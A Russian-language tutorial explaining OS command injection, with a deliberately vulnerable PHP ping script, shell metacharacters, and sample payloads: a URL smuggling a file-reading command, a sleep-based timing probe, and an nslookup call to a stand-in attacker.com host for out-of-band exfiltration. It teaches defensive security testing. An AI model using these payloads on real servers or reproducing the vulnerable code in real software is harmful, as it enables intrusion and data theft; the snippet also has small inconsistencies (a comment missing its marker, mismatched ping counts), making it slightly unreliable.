## Что такое OS Command Injection

**OS Command Injection** - уязвимость, которая позволяет выполнять команды операционной системы на сервере, на котором работает веб-приложение, что часто позволяет полностью скомпрометировать приложение. Также внедрение команд может использоваться для реализации атак на другие системы, за счет доверительных отношений внутри сети.

## Как устроена уязвимость

Данная уязвимость возникает, когда пользовательский ввод напрямую, без предварительной обработки, подставляется в функцию, которая может выполнять команды операционной системы. Специалист по анализу защищенности может внедрить и выполнить произвольные системные команды.

При эксплуатации уязвимости специалисты используют **метасимволы оболочки**, которые используются для объединения, разделения и выполнения команд в контексте операционной системы. Ниже приведены метасимволы, которые работают как на Windows, так и на Unix-подобных ОС на примере конструкции **command1 metacharacter command2**:

- **&** - позволяет запустить первую команду в фоне и, не дожидаясь завершения, запустить вторую
- **&&** - позволяет запустить вторую команду только в случае успешного завершения первой
- **|** - позволяет перенаправить вывод первой команды на вход второй (pipeline)
- **||** - позволяет запустить вторую команду только если первая завершилась ошибкой

В Unix-подобных ОС также работают метасимволы:

- **$(command) **- команда внутри $() выполняется внутри первоначальной команды
- **;** - позволяет последовательно выполнять команды
- **0x0a** или **\n** - символ новой строки
- **`command` **- команда, заключенная в **backticks **выполняется внутри первоначальной команды

## 
Типы OS Command Injection**

### Simple OS Command Injection

**Simple OS Command Injection **- вид атаки, при котором результат выполнения команды напрямую отображается специалисту по анализу защищенности.

Рассмотрим типичный уязвимый фрагмент кода на PHP, реализующий утилиту проверки доступности хоста:

```
<?php
// Получаем параметр из URL без какой-либо проверки
$host = $_GET['host']; 

Прямая конкатенация пользовательского ввода с системной командой
$command = "ping -c 4 " . $host;

// Выполнение команды в оболочке (shell)
system($command);
?>
```

Опасность этого кода заключается в том, что пользовательский ввод без какой-либо проверки напрямую объединяется со строкой системной команды. Полученная строка передается функции **system()**, которая вызывает командную оболочку операционной системы. Оболочка интерпретирует специальные символы (метасимволы) не как обычный текст, а как команды управления выполнением.

Так, например, запрос `http://example.com/?host=example.com; cat /user/secret.txt` выведет:

![](../../_images/1e7ab4a213b1.webp)

Это происходит из-за того, что приложение интерпретирует наш исходный запрос как последовательность команд. Сначала выполняется `ping -c 1 example.com`, затем - команда `cat /user/secret.txt`**.**

### Blind OS Command Injection

**Blind OS Command Injection** - тип атаки, при котором вывод внедренной команды не возвращается пользователю напрямую. Команда успешно выполняется на сервере, однако её результат не включается в HTTP-ответ. В таких ситуациях специалист по анализу защищенности вынужден опираться на косвенные признаки, подтверждающие факт выполнения команды, например:

**Задержка ответа: **если приложение не возвращает вывод команды, но при этом ожидает завершения её выполнения, внедрение команды, принудительно задерживающей ответ, позволяет сделать однозначный вывод об уязвимости. Например, передача в параметре **host** значения **example.com; sleep 10** в Unix-подобных системах** **задержит отправку HTTP-ответа на 10 секунд.

- **Out-of-Band Injection(OAST)**: техника, при которой внедренная команда инициирует внеполосное сетевое взаимодействие с ресурсом, контролируемым специалистом по анализу защищенности. Данный подход позволяет не только подтвердить факт выполнения команды, но и эксфильтровать данные с сервера.

Теперь предположим, что ранее рассмотренное уязвимое веб-приложение не выводит результат внедренной команды. В такой ситуации прямая эксфильтрация данных через вывод команды становится невозможной, однако остается эффективной техника **Out-of-Band**, использующая DNS-запросы.

![](../../_images/fb1a0770f039.webp)

Если специалист по анализу защищенности направит серверу запрос `http://example.com/?host=example.com; nslookup http://attacker.com` на сервере выполнится команда `nslookup http://attacker.com`, которая инициирует DNS-запрос к домену **attacker.com**. Даже если результат выполнения команды не отображается в браузере, сам факт обращения к DNS-серверу домена **attacker.com** будет зафиксирован.

![](../../_images/adedfe826c8d.webp)

Когда уязвимое приложение выполняет внедренную команду **nslookup**, в логах появляется запись о входящем **DNS-запросе**.

## Последствия эксплуатации уязвимости

Уязвимость данного типа позволяет специалисту по анализу защищенности выполнять системные команды от имени приложения или пользователя, под которым запущен веб-сервер. В первую очередь атакующий может получить **несанкционированный доступ к данным**, хранящимся на сервере. Это могут быть конфигурационные файлы, базы данных, резервные копии, ключи доступа и токены. 
Также эксплуатация данной уязвимости нередко приводит к **полной компрометации сервера**. Атакующий способен создавать новые учётные записи, изменять системные настройки, загружать вредоносные файлы, устанавливать дополнительные инструменты удалённого доступа и закрепляться в системе для дальнейшего присутствия.

## Инструменты, используемые атакующими для обнаружения и последующей эксплуатации OS Command Injection

- [**Commix**](https://github.com/commixproject/commix) - специализированный инструмент, предназначенный для автоматизированного поиска и эксплуатации уязвимостей класса OS Command Injection. Позволяет выполнять внедрение команд, применять техники обхода защитных механизмов и в отдельных сценариях получать удалённый доступ к системе.
- [**Burp Suite**](https://portswigger.net/burp) - один из наиболее распространённых инструментов для тестирования безопасности веб-приложений. Используется для перехвата, изменения и анализа HTTP-запросов, а также автоматизированного поиска различных уязвимостей, включая OS Command Injection.
- [**wfuzz** ](https://github.com/xmendez/wfuzz)- инструмент для фаззинга веб-приложений, позволяющий массово тестировать параметры HTTP-запросов с различными наборами полезных нагрузок. Применяется для выявления ошибок фильтрации ввода и признаков OS Command Injection.
